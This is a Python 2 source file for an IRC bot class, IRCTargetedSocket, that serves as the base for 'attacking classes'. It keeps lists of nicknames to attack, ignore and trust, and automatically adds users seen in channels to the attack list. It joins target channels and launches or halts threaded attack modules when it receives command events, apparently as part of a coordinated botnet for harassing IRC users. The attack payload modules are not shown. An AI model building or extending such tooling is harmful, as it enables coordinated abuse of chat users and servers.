#!/bin/python

import hashlib
import random
import socket
import ssl
import string
import sys
import threading
import time

import Queue

import ircsocket
import modules
import moduledelegate

class IRCTargetedSocket(ircsocket.IRCSocket, threading.Thread):
	'''
	IRCTargetedSocket is a threaded IRC socket with additional behavior keeping track of
	names to attack, ignore, and trust. When an object of this class is started, the run()
	interface method is automatically invoked and creates a connection to the server.
	Threaded objects of this class should avoid directly calling connect()

	Additionally, it contains an eventnotifier.EventNotifier object to publish messages
	to a event system for other subscribing objects.

	All attacking classes should inherit this functionality.
	'''

	def __init__(self, server, user, attack_channels=[], attack_names=[],
				 ignore_names=[], trusted_names=[]):

		ircsocket.IRCSocket.__init__(self, server, user, attack_channels)

		threading.Thread.__init__(self)

		self.setNodes([])

		self.setAttackNames(attack_names)
		self.setIgnoreNames(ignore_names)
		self.setTrustedNames(trusted_names)

		# Initial list of attack names passed in
		# attack_name_override flag is set to True
		# to allow strict attacking of only those nicks
		if self.getAttackNames() != []:
			self.setAttackNameOverride(True)
		else:
			self.setAttackNameOverride(False)

		self.setContext("irctargetedsocket")

		self.setNotifier(None)

		modDelegate = moduledelegate.ModuleDelegate()
		self.setModules(modDelegate.getModules())

		# Dictionary of Module -> Thread
		self.setAttackQueue({})
		self.attack_thread_queue = Queue.Queue()

	def run(self):
		self.connect()

	def event(self, line):
		super(IRCTargetedSocket, self).event(line)

		s = self.getServer()
		u = self.getUser()

		args = line.split()
		c = self.getCodes()

		if args[1] in c:
			reply = c[args[1]]
			m = "{0} ({1}) received.".format(s.getAddress(), args[1])

			if reply in ("ERR_NONICKNAMEGIVEN", "ERR_ERRONEUSNICKNAME",
						   "ERR_NICKNAMEINUSE", "ERR_NICKCOLLISION"):
				# This is called after ircsocket.py changes the name.
				old_nick = args[3]
				self.getNotifier().publish(18, "", [old_nick, u.getNickname(), self])

			# Nicks replied back from channel join or /NAMES
			elif reply == "RPL_NAMREPLY":
				self.sendStatus(m)
				chan = args[4]

				for channel in self.getChannels():
					if channel.getName() == chan:
						for chan_user in channel.getUsers():
							n = chan_user.getNickname()
							if n != u.getNickname() and n not in self.getIgnoreNames() and n not in self.getAttackNames() and n not in self.getNodeNames():
								self.notifier.publish(0, "", [n])

			# Nickname not found on server
			elif reply in ("ERR_NOSUCHNICK", "ERR_WASNOSUCHNICK"):
				self.sendStatus(m)

				name = args[3]
				if name[:1] in '~!@%&+:':
					name = name[1:]

				self.getAttackNames().remove(name)

		# args[1] not in c
		elif args[1] == "PRIVMSG":
			target = args[0].split('!')[0][1:]
			message = "".join(str(s) + " " for s in args[3:]).split(':')[1].rstrip()

			if "#" == args[2][0]:
				pass
			else:
				self.processCommand(target, message)

		elif args[1] == "NICK":
			old_nick = args[0].split("!")[0].replace(":", "")
			self.getNotifier().publish(18, "", [old_nick, u.getNickname(), self])

	def inform(self, event, target, data):
		s = self.getServer()
		u = self.getUser()

		self.sendStatus("event={0}, target={1}, data={2} informed".format(event, target, data))

		if event == 0: #ADD_ATTACK_NAMES
			self.listAppend(data, self.getAttackNames())

		elif event == 1: #REMOVE_ATTACK_NAMES
			self.listRemove(data, self.getAttackNames())

		elif event == 2: #LIST_ATTACK_NAMES
			self.listNames(target, "attack_names", self.getAttackNames())

		elif event == 3: #ADD_IGNORE_NAMES
			self.listAppend(data, self.getIgnoreNames())

		elif event == 4: #REMOVE_IGNORE_NAMES
			self.listRemove(data, self.getIgnoreNames())

		elif event == 5: #LIST_IGNORE_NAMES
			self.listNames(target, "ignore_names", self.getIgnoreNames())

		elif event == 6: #ADD_TRUSTED_NAMES
			self.listAppend(data, self.getTrustedNames())

		elif event == 7: #REMOVE_TRUSTED_NAMES
			self.listRemove(data, self.getTrustedNames())

		elif event == 8: #LIST_TRUSTED_NAMES
			self.listNames(target, "trusted_names", self.getTrustedNames())

		elif event == 9: #ADD_ATTACK_CHANNELS
			self.listAppend(data, self.getChannels())

			for channel in data:
				self.join(channel)

		elif event == 10: #REMOVE_ATTACK_CHANNELS
			self.listRemove(data, self.getChannels())

			for channel in data:
				self.part(channel)

		elif event == 11: #LIST_ATTACK_CHANNELS
			self.listNames(target, "channels", self.getChannels())

		elif event == 13: #START_ATTACK
			attackData = {
				"target" : target,
				"data" : data
			}

			if self.attack_thread_queue.empty() and u.getNickname() != self.getContext():
				self.attack_thread_queue.put("attacking")
				queue = self.getAttackQueue()

				for attack in queue.keys():
					attack.setData(attackData)
					attack.setNode(self)
					queue[attack].start()

		elif event == 14: #STOP_ATTACK

			while not self.attack_thread_queue.empty():
				self.sendStatus("STOPPING ATTACK")

				self.attack_thread_queue.get_nowait()
				self.attack_thread_queue.task_done()

			self.setAttackQueue({})

		elif event == 15: #ADD_ATTACK_QUEUE
			for d in data:
				for m in self.getModules():
					if m.getModuleName().lower() == d.lower():
						t = threading.Thread(target=m.start, args=[self.attack_thread_queue])
						t.setDaemon(True)
						self.getAttackQueue()[m] = t

						self.sendStatus(self.getAttackQueue()[m])

		elif event == 16: #REMOVE_ATTACK_QUEUE
			for d in data:
				for m in self.getModules():
					if m.getModuleName().lower()  == d.lower():
						queue = self.getAttackQueue()
						queue[m] = None
						queue.pop(m, None)

		elif event == 18: #NODE_NAME_CHANGE
			old_nick = data[0]
			new_nick = data[1]
			new_node = data[2]

			nodes = self.getNodes()
			for node in nodes:
				if node.getUser().getNickname() == old_nick:
					nodes.remove(node)
					nodes.append(new_node)
					break

			attack_names = self.getAttackNames()
			for name in attack_names:
				if name == old_nick:
					attack_names.remove(old_nick)
					break

			ignore_names = self.getIgnoreNames()
			for name in ignore_names:
				if name == old_nick:
					ignore_names.remove(old_nick)
					ignore_names.append(new_nick)
					break


	def processCommand(self, target, message):
		pass

	def listAppend(self, values, l):
		for value in values:
			if value not in l:
				l.append(value)

	def listRemove(self, values, l):
		for value in values:
			if value in l:
				l.remove(value)

	def listNames(self, target, listname, names):
		t = time.strftime('[%I:%M:%S]')
		m = '{0} | [{1}@{2}] - {3}={4}'

		i = 0
		l = []
		for name in names:
			l.append(name)
			i = i + 1

			if i % 16 == 0:
				self.sendMessage(target, m.format(t, self.getUser().getNickname(), self.getContext(), listname, l))
				self.sendStatus(m.format(t, self.getUser().getNickname(), self.getContext(), listname, l))
				l[:] = []

		if l != []:
			self.sendMessage(target, m.format(t, self.getUser().getNickname(), self.getContext(), listname, l))
			self.sendStatus(m.format(t, self.getUser().getNickname(), self.getContext(), listname, l))

		if names == None or names == []:
			self.sendMessage(target, m.format(t, self.getUser().getNickname(), self.getContext(), listname, names))
			self.sendStatus(m.format(t, self.getUser().getNickname(), self.getContext(), listname, names))

	def getCommands(self):
		return self.commands

	def setCommands(self, commands):
		self.commands = commands

	def getAttackNameOverride(self):
		return self.attack_name_override

	def setAttackNameOverride(self, attack_name_override):
		self.attack_name_override = attack_name_override

	def getAttackNames(self):
		return self.attack_names

	def setAttackNames(self, attack_names):
		self.attack_names = attack_names

	def getAttackQueue(self):
		return self.attack_queue

	def setAttackQueue(self, attack_queue):
		self.attack_queue = attack_queue

	def getTrustedNames(self):
		return self.trusted_names

	def setTrustedNames(self, trusted_names):
		self.trusted_names = trusted_names

	def getIgnoreNames(self):
		return self.ignore_names

	def setIgnoreNames(self, ignore_names):
		self.ignore_names = ignore_names

	def getModules(self):
		return self.modules

	def setModules(self, modules):
		self.modules = modules

	def getNodes(self):
		return self.nodes

	def setNodes(self, nodes):
		self.nodes = nodes

	def getNodeNames(self):
		names = []
		for n in self.getNodes():
			names.append(n.getUser().getNickname())
		return names

	def getNotifier(self):
		return self.notifier

	def setNotifier(self, notifier):
		self.notifier = notifier
